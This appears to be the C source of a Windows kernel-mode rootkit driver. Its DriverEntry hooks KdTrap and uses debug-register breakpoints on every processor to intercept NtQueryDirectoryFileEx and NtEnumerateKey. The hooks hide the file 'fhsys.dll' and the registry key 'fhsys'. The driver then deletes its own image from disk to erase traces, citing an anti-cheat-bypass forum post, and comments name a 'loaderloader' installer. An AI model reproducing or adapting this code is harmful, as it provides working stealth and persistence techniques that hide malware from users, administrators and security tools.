#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>

#include "stdint.h"
#include "Hook-KdTrap/HookKdTrap.h"
#include "hde/hde64.h"
#include "handler.h"
#include "util.h"
#include "querydir.h"
#include "enumkey.h"

__declspec(noinline) BOOLEAN fun(int n, int m) {
	int r;
	r = n * m;
	++r;
	return r >= 65;
}

__declspec(noinline) void thread(PVOID param) {
	LARGE_INTEGER delay;
	delay.QuadPart = -(10000000 * 60);
	while (1) {
		DbgPrintEx(0, 0, "[Bot] Thread %p %p\n", __readdr(0), __readdr(7));
		KeDelayExecutionThread(KernelMode, FALSE, &delay);
	}
}

funAddr_t funAddr;

__declspec(noinline) void setDr(PVOID param) {
	uint64_t dr0, dr1, dr7;
	LARGE_INTEGER delay;
	delay.QuadPart = -1;
	dr7 = __readdr(7);

	dr0 = (uint64_t)NtQueryDirectoryFileEx;
	dr7 |= 0x1 << 1;
	dr7 &= ~(0xf << 16);

	dr1 = funAddr.NtEnumerateKey;
	dr7 |= 0x1 << 3;
	dr7 &= ~(0xf << 20);

	while (1) {
		__writedr(0, dr0);
		__writedr(1, dr1);
		__writedr(7, dr7);
		KeDelayExecutionThread(UserMode, TRUE, &delay);
	}
}

extern uint32_t drHit;

NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
NtEnumerateKey_t origNtEnumerateKey;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	HANDLE han;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK io;
	NTSTATUS status;
	UNICODE_STRING us;
	PFILE_OBJECT ob;
	PSECTION_OBJECT_POINTERS secObPtr;
	ULONG i, n;

	rand_state_t state;
	hde64s hs;
	const uint8_t absJmp[] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
	uint8_t *tramp, queryDirInst, enumKeyInst;

	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");
	RtlInitUnicodeString(&hiddenReg, L"fhsys");

	keyArrLock = ExAllocatePoolWithTag(NonPagedPool, sizeof(KSPIN_LOCK) + MAX_KEYHANDLEARR * sizeof(HANDLE), rand_tag(&state));
	keyHandleArr = (PHANDLE)(((uint8_t*)keyArrLock) + sizeof(KSPIN_LOCK));
	memset(keyHandleArr, 0, MAX_KEYHANDLEARR * sizeof(HANDLE));
	KeInitializeSpinLock(keyArrLock);

	rand_init(&state);

	//funAddr is set here
	HookKdTrap(handler);

	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
	enumKeyInst = hde64_disasm(funAddr.NtEnumerateKey, &hs);
	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, (uint64_t)queryDirInst + (uint64_t)enumKeyInst + sizeof(absJmp) * 2 + 8 * 2, rand_tag(&state));

	origNtQueryDirectoryFileEx = tramp;
	memcpy(tramp, NtQueryDirectoryFileEx, queryDirInst);
	tramp += queryDirInst;
	memcpy(tramp, absJmp, sizeof(absJmp));
	tramp += sizeof(absJmp);
	*((uint64_t*)tramp) = (uint64_t)((uint8_t*)NtQueryDirectoryFileEx + queryDirInst);
	tramp += 8;

	origNtEnumerateKey = tramp;
	memcpy(tramp, (PVOID)funAddr.NtEnumerateKey, enumKeyInst);
	tramp += enumKeyInst;
	memcpy(tramp, absJmp, sizeof(absJmp));
	tramp += sizeof(absJmp);
	*((uint64_t*)tramp) = funAddr.NtEnumerateKey + (uint64_t)enumKeyInst;
	tramp += 8;

	//KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
	//__debugbreak();

	n = KeQueryMaximumProcessorCount();
	for (i = 0; i < n; ++i) {
		PsCreateSystemThread(&han, 0, NULL, NULL, NULL, setDr, NULL);
		ZwClose(han);
	}

	DbgPrintEx(0, 0, "[Bot] %wZ\n", *RegistryPath);

	/*
	InitializeObjectAttributes(&oa, RegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	ZwOpenKey(&han, KEY_ALL_ACCESS, &oa);
	status = ZwDeleteKey(han);
	DbgPrintEx(0, 0, "[Bot] Delete key %x\n", status);
	ZwClose(han);
	*/

	//NOTE: loaderloader first run: icudtl.dat
	//NOTE: loaderloader installed: fhsys.dll

	IoQueryFullDriverPath(DriverObject, &us);
	DbgPrintEx(0, 0, "[Bot] %wZ\n", us);

	//https://www.unknowncheats.me/forum/anti-cheat-bypass/263872-driver-destroy.html
	InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = IoCreateFileEx(&han, SYNCHRONIZE | DELETE, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, NULL);
	DbgPrintEx(0, 0, "[Bot] CreateFileEx %x\n", status);

	status = ObReferenceObjectByHandleWithTag(han, SYNCHRONIZE | DELETE, *IoFileObjectType, KernelMode, rand_tag(&state), &ob, NULL);
	DbgPrintEx(0, 0, "[Bot] ReferenceObject %x\n", status);

	secObPtr = ob->SectionObjectPointer;
	secObPtr->ImageSectionObject = NULL;

	MmFlushImageSection(secObPtr, MmFlushForDelete);
	ObfDereferenceObject(ob);
	ObCloseHandle(han, KernelMode);

	status = ZwDeleteFile(&oa);
	DbgPrintEx(0, 0, "[Bot] Delete file %x\n", status);

	ExFreePool(us.Buffer);

	status = PsCreateSystemThread(&han, 0, NULL, NULL, NULL, thread, NULL);
	DbgPrintEx(0, 0, "[Bot] Thread %x\n", status);

	//vybral jsem max
	DbgPrintEx(0, 0, "[Bot] Active: %u Max: %u\n", KeQueryActiveProcessorCount(NULL), KeQueryMaximumProcessorCount());
	DbgPrintEx(0, 0, "[Bot] %p %p\n", __readdr(0), __readdr(7));
	DbgPrintEx(0, 0, "[Bot] %u\n", fun(4, 5));
	DbgPrintEx(0, 0, "[Bot] Hit %u\n", drHit);
	DbgPrintEx(0, 0, "[Bot] LOADED\n");
	return STATUS_SUCCESS;
}